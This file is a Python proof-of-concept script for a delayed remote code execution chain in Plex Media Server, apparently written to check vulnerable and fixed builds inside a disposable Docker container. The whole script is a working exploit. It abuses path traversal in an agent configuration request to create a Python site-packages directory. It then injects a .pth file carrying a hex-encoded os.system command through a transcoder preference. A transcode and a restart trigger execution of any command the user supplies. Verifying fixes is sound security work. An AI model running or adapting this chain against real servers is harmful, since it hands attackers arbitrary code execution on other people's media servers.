#!/usr/bin/env python3
import argparse
import pathlib
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request


PTH_DIRECTORY = "/config/.local/lib/python2.7/site-packages"
TRAVERSAL = "../../../../../.local/lib/python2.7/site-packages"


class NoRedirectHandler(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None


def request(url, method="GET", params=None, headers=None, timeout=20):
    if params:
        url += ("&" if "?" in url else "?") + urllib.parse.urlencode(params)
    req = urllib.request.Request(url, method=method, headers=headers or {})
    opener = urllib.request.build_opener(NoRedirectHandler)
    try:
        with opener.open(req, timeout=timeout) as response:
            return response.status, response.read()
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read()


def docker_exists(container, path):
    result = subprocess.run(
        ["docker", "exec", container, "test", "-e", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def docker_remove_generated(container, pth_path):
    for name in (
        pathlib.PurePosixPath(pth_path).name,
        pathlib.PurePosixPath(pth_path).name + ".mbtree",
    ):
        subprocess.run(
            [
                "docker",
                "exec",
                container,
                "find",
                PTH_DIRECTORY,
                "-maxdepth",
                "1",
                "-type",
                "f",
                "-name",
                name,
                "-delete",
            ],
            check=True,
            stdout=subprocess.DEVNULL,
        )


def main():
    parser = argparse.ArgumentParser(
        description="Plex Framework and transcoder-preference delayed RCE chain"
    )
    parser.add_argument("--url", required=True, help="Plex server origin")
    parser.add_argument("--rating-key", required=True, type=int)
    parser.add_argument("--command", required=True)
    parser.add_argument("--container", required=True, help="Disposable Docker container")
    parser.add_argument("--verify-path", required=True)
    parser.add_argument("--expect", choices=("vulnerable", "fixed"), required=True)
    parser.add_argument("--keep-payload", action="store_true")
    args = parser.parse_args()

    origin = args.url.rstrip("/")
    parsed = urllib.parse.urlsplit(origin)
    if (parsed.scheme not in ("http", "https") or not parsed.netloc or
            parsed.path or parsed.query or parsed.fragment):
        parser.error("--url must be an HTTP(S) origin without a path")
    if args.rating_key <= 0:
        parser.error("--rating-key must be greater than zero")
    if not args.verify_path.startswith("/"):
        parser.error("--verify-path must be an absolute container path")
    if docker_exists(args.container, args.verify_path):
        raise RuntimeError(f"verification path already exists: {args.verify_path}")

    stamp = int(time.time() * 1000)
    pth_path = f"{PTH_DIRECTORY}/plex_legacy_rce_{stamp}.pth"
    command_hex = args.command.encode("utf-8").hex()
    payload = (
        f"pass=1:stats={pth_path}:zones=\n"
        "0,0,q=20,stats=x\n"
        f"import os;os.system('{command_hex}'.decode('hex'))"
    )

    directory_existed = docker_exists(args.container, PTH_DIRECTORY)
    if args.expect == "vulnerable" and directory_existed:
        raise RuntimeError(
            f"chain precondition is not clean; directory exists: {PTH_DIRECTORY}"
        )
    print("[1/4] Request Python user-site directory creation")
    config_status, _ = request(
        f"{origin}/system/agents/tv.plex.agents.movie/config/1",
        method="PUT",
        params={"identifier": TRAVERSAL, "order": "com.plexapp.agents.localmedia"},
    )
    print(f"Configuration status: {config_status}")
    if args.expect == "vulnerable":
        if config_status != 200 or not docker_exists(args.container, PTH_DIRECTORY):
            raise RuntimeError("Framework request did not create the Python site directory")

    print("[2/4] Set TranscoderH264OptionsOverride")
    pref_status, _ = request(
        f"{origin}/:/prefs",
        method="PUT",
        params={"TranscoderH264OptionsOverride": payload},
    )
    print(f"Preference status: {pref_status}")

    if args.expect == "fixed":
        request(
            f"{origin}/:/prefs",
            method="PUT",
            params={"TranscoderH264OptionsOverride": ""},
        )
        if pref_status != 403 or docker_exists(args.container, pth_path):
            raise RuntimeError("fixed behavior was not observed")
        print("PASS: fixed build rejected the protected preference")
        return

    if pref_status != 200:
        raise RuntimeError("vulnerable build did not accept the preference")

    headers = {
        "X-Plex-Client-Identifier": f"legacy-rce-client-{stamp}",
        "X-Plex-Session-Identifier": f"legacy-rce-client-{stamp}",
        "X-Plex-Product": "Plex Web",
        "X-Plex-Version": "4.0",
        "X-Plex-Platform": "Chrome",
        "X-Plex-Device": "Linux",
    }
    transcode = {
        "path": f"/library/metadata/{args.rating_key}",
        "mediaIndex": 0,
        "partIndex": 0,
        "protocol": "hls",
        "directPlay": 0,
        "directStream": 0,
        "videoResolution": "320x240",
        "videoQuality": 20,
        "maxVideoBitrate": 750,
        "session": f"legacy-rce-{stamp}",
    }

    placed = False
    preference_reset = False
    try:
        print("[3/4] Start HLS transcode")
        request(
            f"{origin}/video/:/transcode/universal/start.m3u8",
            params=transcode,
            headers=headers,
        )
        request(
            f"{origin}/video/:/transcode/universal/session/"
            f"{transcode['session']}/base/index.m3u8",
            headers=headers,
        )
        for _ in range(80):
            if docker_exists(args.container, pth_path):
                placed = True
                break
            time.sleep(0.25)
        if not placed:
            raise RuntimeError(f"payload was not written to {pth_path}")

        reset_status, _ = request(
            f"{origin}/:/prefs",
            method="PUT",
            params={"TranscoderH264OptionsOverride": ""},
        )
        if reset_status != 200:
            raise RuntimeError(
                f"payload was placed but preference reset returned HTTP {reset_status}"
            )
        preference_reset = True
        print("[4/4] Restart container and verify command execution")
        subprocess.run(
            ["docker", "restart", args.container],
            check=True,
            stdout=subprocess.DEVNULL,
        )
        for _ in range(120):
            if docker_exists(args.container, args.verify_path):
                break
            time.sleep(0.25)
        else:
            raise RuntimeError("command execution was not verified")
    finally:
        if not preference_reset:
            try:
                retry_status, _ = request(
                    f"{origin}/:/prefs",
                    method="PUT",
                    params={"TranscoderH264OptionsOverride": ""},
                    timeout=3,
                )
                if retry_status != 200:
                    print(
                        f"warning: preference reset returned HTTP {retry_status}",
                        file=sys.stderr,
                    )
            except OSError:
                print("warning: preference reset request failed", file=sys.stderr)
        if placed and not args.keep_payload:
            docker_remove_generated(args.container, pth_path)
            print(f"Removed generated artifacts for run {stamp}")

    print(f"PASS: {args.verify_path} was created by the supplied command")


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, subprocess.SubprocessError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        raise SystemExit(1)
